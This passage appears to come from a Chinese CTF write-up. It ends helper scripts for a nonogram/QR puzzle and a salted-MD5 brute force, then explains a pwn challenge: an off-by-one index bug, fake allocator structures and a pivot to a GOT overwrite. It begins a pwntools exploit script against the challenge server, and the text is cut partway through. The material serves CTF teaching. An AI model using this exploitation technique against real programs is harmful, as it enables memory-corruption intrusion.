&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;board_flat&nbsp;=&nbsp;[board[i,&nbsp;j]&nbsp;for&nbsp;i&nbsp;in&nbsp;range(rows)&nbsp;for&nbsp;j&nbsp;in&nbsp;range(cols)]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Flattened&nbsp;board&nbsp;for&nbsp;labeling.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;This&nbsp;labeling&nbsp;was&nbsp;inspired&nbsp;by&nbsp;a&nbsp;suggestion&nbsp;from
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pascal&nbsp;Van&nbsp;Hentenryck&nbsp;about&nbsp;my&nbsp;(hakank&#39;s)&nbsp;Comet
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;nonogram&nbsp;model.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;board_label&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;rows&nbsp;*&nbsp;row_rule_len&nbsp;&lt;&nbsp;cols&nbsp;*&nbsp;col_rule_len:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(rows):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(cols):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;board_label.append(board[i,&nbsp;&nbsp;&nbsp;j])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(cols):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(rows):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;board_label.append(board[i,&nbsp;j])
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;constraints
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(rows):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check_rule(row_rules[i],&nbsp;[board[i,&nbsp;j]&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(cols)])
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(cols):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check_rule(col_rules[j],&nbsp;[board[i,&nbsp;j]&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(rows)])
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;solution&nbsp;and&nbsp;search
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parameters&nbsp;=&nbsp;pywrapcp.DefaultPhaseParameters()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parameters.heuristic_period&nbsp;=&nbsp;200000
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db&nbsp;=&nbsp;solver.DefaultPhase(board_label,&nbsp;parameters)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&#39;before&nbsp;solver,&nbsp;wall&nbsp;time&nbsp;=&nbsp;&#39;,&nbsp;solver.WallTime(),&nbsp;&#39;ms&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solver.NewSearch(db)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num_solutions&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;results&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;solver.NextSolution():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num_solutions&nbsp;+=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(rows):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row&nbsp;=&nbsp;[board[i,&nbsp;j].Value()&nbsp;for&nbsp;j&nbsp;&nbsp;&nbsp;in&nbsp;range(cols)]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row_pres&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;row:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;j&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row_pres.append(&#39;1&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row_pres.append(&#39;0&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result.extend(row_pres)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;&#39;&#39;.join(result)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;&#39;&nbsp;&nbsp;&#39;,&nbsp;&#39;&#39;.join(row_pres)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;&#39;&nbsp;&nbsp;&#39;,&nbsp;&#39;-&#39;&nbsp;*&nbsp;cols
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;results.append(result)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;num_solutions&nbsp;==&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;&#39;2&nbsp;solutions&nbsp;is&nbsp;&nbsp;&nbsp;enough...&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solver.EndSearch()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;&#39;num_solutions:&#39;,&nbsp;&nbsp;&nbsp;num_solutions
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;&#39;failures:&#39;,&nbsp;solver.Failures()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;&#39;branches:&#39;,&nbsp;solver.Branches()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;&#39;WallTime:&#39;,&nbsp;solver.WallTime(),&nbsp;&#39;ms&#39;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;results</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">生成二维码的解题的脚本</span></p><p><br/></p><pre class="brush:python;toolbar:false">from&nbsp;PIL&nbsp;import&nbsp;Image
import&nbsp;math
import&nbsp;itertools
&nbsp;
&nbsp;
class&nbsp;BinQR:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self,&nbsp;s):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;isinstance(s,&nbsp;str):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;ValueError(&quot;You&nbsp;must&nbsp;&nbsp;&nbsp;input&nbsp;a&nbsp;string&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.data&nbsp;=&nbsp;s.replace(&#39;\r&#39;,&nbsp;&nbsp;&nbsp;&#39;&#39;).replace(&#39;\n&#39;,&nbsp;&#39;&#39;).replace(&#39;\t&#39;,&nbsp;&#39;&#39;).replace(&#39;&nbsp;&#39;,&nbsp;&#39;&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;length&nbsp;=&nbsp;len(self.data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.data.count(&#39;0&#39;)&nbsp;+&nbsp;&nbsp;&nbsp;self.data.count(&#39;1&#39;)&nbsp;!=&nbsp;length:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;ValueError(&quot;You&nbsp;can&nbsp;&nbsp;&nbsp;only&nbsp;input&nbsp;1&nbsp;and&nbsp;0&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.col&nbsp;=&nbsp;int(math.sqrt(length))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;pow(self.col,&nbsp;2)&nbsp;!=&nbsp;length:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;ValueError(&quot;You&nbsp;must&nbsp;&nbsp;&nbsp;input&nbsp;a&nbsp;square&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;self.data&nbsp;=&nbsp;[list(self.data[i:i&nbsp;&nbsp;&nbsp;+&nbsp;self.col])&nbsp;for&nbsp;i&nbsp;in&nbsp;xrange(0,&nbsp;length,&nbsp;self.col)]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.pic&nbsp;=&nbsp;Image.new(&quot;RGB&quot;,&nbsp;&nbsp;&nbsp;(self.col,&nbsp;self.col))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i,&nbsp;(y,&nbsp;x)&nbsp;in&nbsp;&nbsp;&nbsp;enumerate(itertools.product(*([xrange(self.col)]&nbsp;*&nbsp;2))):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.pic.putpixel((x,&nbsp;y),&nbsp;(0,&nbsp;0,&nbsp;&nbsp;&nbsp;0)&nbsp;if&nbsp;self.data[i]&nbsp;==&nbsp;&#39;1&#39;&nbsp;else&nbsp;(255,&nbsp;255,&nbsp;255))
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;save(self,&nbsp;path):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.pic.save(path)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;show(self,&nbsp;resize=10):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;resize:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.pic.resize((self.col&nbsp;*&nbsp;&nbsp;&nbsp;resize,&nbsp;self.col&nbsp;*&nbsp;resize)).show()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.pic.show()</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span></p><pre class="brush:python;toolbar:false">import&nbsp;hashlib
import&nbsp;string
&nbsp;
print
a&nbsp;=&nbsp;[]
for&nbsp;line&nbsp;in&nbsp;open(&#39;input2&#39;,&nbsp;&nbsp;&nbsp;&#39;r&#39;).readlines():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;md5,&nbsp;_,&nbsp;salt&nbsp;=&nbsp;line.strip().split(&#39;|&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;salt&nbsp;=&nbsp;salt.split(&#39;:&#39;)[-1]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a.append((md5.strip(),&nbsp;salt.strip()))
&nbsp;
&nbsp;
def&nbsp;get_letter(md5,&nbsp;salt):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&nbsp;md5.index(&#39;?&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;string.printable:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;m2&nbsp;=&nbsp;hashlib.md5(i&nbsp;+&nbsp;&nbsp;&nbsp;salt).hexdigest()[8:24]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;md5&nbsp;=&nbsp;md5[:index]&nbsp;+&nbsp;m2[index]&nbsp;+&nbsp;&nbsp;&nbsp;md5[index&nbsp;+&nbsp;1:]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;m2&nbsp;==&nbsp;md5:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;Exception(i)
&nbsp;
&nbsp;
b&nbsp;=&nbsp;[]
for&nbsp;md5,&nbsp;salt&nbsp;in&nbsp;a:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b.append(get_letter(md5,&nbsp;salt))
print&nbsp;&#39;&#39;.join(b)</pre><p><br/></p><p><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">400&nbsp; Pwn-1最后是爆破的</span></strong></span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这道题目是一个数值排序的程序，它模拟了内存的分配与释放，对于历史记录信息的内容和管理结构是用自己定义的内存分配释放进行的，主要的洞就在于，对于输入的数字序列进行修改和查询时，可以越界一个index：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">查询：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0181c79cbf7f8809ca.png" title="t01b67cf44570390d73.png" alt="http://p7.qhimg.com/t01b67cf44570390d73.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">修改：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0158b6bcad43f905e8.png" title="t0124f1670d1ce408bf.png" alt="http://p0.qhimg.com/t0124f1670d1ce408bf.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">在自己管理的内存部分，存储两类数据：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">信息内容：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 history_info_struct struc ; (sizeof=0x8)</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 count&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000004 number_buff&nbsp;&nbsp;&nbsp;&nbsp; dd ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; offset</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000008 history_info_struct ends</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">信息管理结构：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 history_manager_struct struc ; (sizeof=0x8)</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; offset</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000004 next&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000008 history_manager_struct ends</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">而这两种结构在这部分内存中是连续排放的，所以越界很容易修改和查看另一种结构体的第一个int值，count或者info（属于history_info_struct类型）</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这样泄露很容易，但是修改的值不太好利用，因为很多地方参数都是history_info_struct，这个结构没法直接修改，只能改掉历史记录中的信息，而不是正在使用的信息，于是去找重点地方，如下：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01fc3fe41c3381cd1b.png" title="t0183c6e50e63448cfd.png" alt="http://p1.qhimg.com/t0183c6e50e63448cfd.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">可以看见，在memcpy的时候，如果n为0，那么dest里面的东西会保持不变，于是利用思路如下：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">构造两个假的history_info_struct，其中一个的count的值为-1， 另外一个的count为一个很大的数（0x7ffffff0）,然后利用index修改history_manager_struct结构中的info，使其指向这个假节点（count的值为-1的地方），然后控制内存使得下一个节点分配出来的刚好是count为0x7ffffff0的地方时，进行reload操作，此时alloc_mem_diy_8048B11（0）刚好能够返回大小为8的节点，而dest中的信息依然不变，其中count域却成了0x7ffffff0，这样就可以在处理update和query的时候进行大范围的查询和修改。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">然而这样还是有问题，因为0x7ffffff0+heap的范围依然很小，根本达不到got表，于是考虑一个跳板，由于自定义的内存部分大小是0x10000，管理内存的控制结构却要重新malloc，而且只能是内存碎化，没法合并，而且内存的管理是按照从小到大排序，每次从前往后匹配，直到找到合适的为止。这部分内存的管理结构如下：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 manager_info_struct struc ; (sizeof=0x10,)</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 mem_size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000004 in_use&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000008 data_buff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; offset</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">0000000C next&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dd ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; offset</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000010 manager_info_struct ends</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">通过前面的update可以修改后续heap中的manager_info_struct结构，将其置为可用，且data_buff指向got表，那么下次申请到的就是got的内容，此时就可以任意查询和修改了。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">整个思路就是这样，关键得去布置内存，由于我信息泄露实现的比较早（有点多余了），导致最后到达got的时候，只是用了修改这个功能。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">详细的布置方法见脚本：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">__author__&nbsp;=&nbsp;&quot;pxx&quot;
from&nbsp;zio&nbsp;import&nbsp;*
from&nbsp;pwn&nbsp;import&nbsp;*
import&nbsp;struct
#target&nbsp;=&nbsp;&quot;./pwn1&quot;
target&nbsp;=&nbsp;(&quot;pwn.lab.seclover.com&quot;,&nbsp;11111)
&nbsp;
def&nbsp;get_io(target):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;&quot;green&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;w_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;&quot;blue&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999,&nbsp;print_read&nbsp;=&nbsp;r_m,&nbsp;print_write&nbsp;=&nbsp;w_m)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;io
&nbsp;
def&nbsp;history(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;history&quot;)
&nbsp;
def&nbsp;t_reload(io,&nbsp;t_id):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;reload&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Reload&nbsp;history&nbsp;ID:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(t_id))
&nbsp;
def&nbsp;clear(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;clear&quot;)
&nbsp;
def&nbsp;sort(io,&nbsp;seq):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;sort&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;How&nbsp;many&nbsp;numbers&nbsp;do&nbsp;you&nbsp;want&nbsp;to&nbsp;sort:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(len(seq)))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;item&nbsp;in&nbsp;seq:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Enter&nbsp;a&nbsp;number:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(item)
&nbsp;
def&nbsp;sort2(io,&nbsp;seq,&nbsp;count):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;sort&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;How&nbsp;many&nbsp;numbers&nbsp;do&nbsp;you&nbsp;want&nbsp;to&nbsp;sort:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(count))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;item&nbsp;in&nbsp;seq:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Enter&nbsp;a&nbsp;number:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(item)
&nbsp;
def&nbsp;t_exit(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;exit&quot;)
&nbsp;
def&nbsp;sub_query(io,&nbsp;index):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
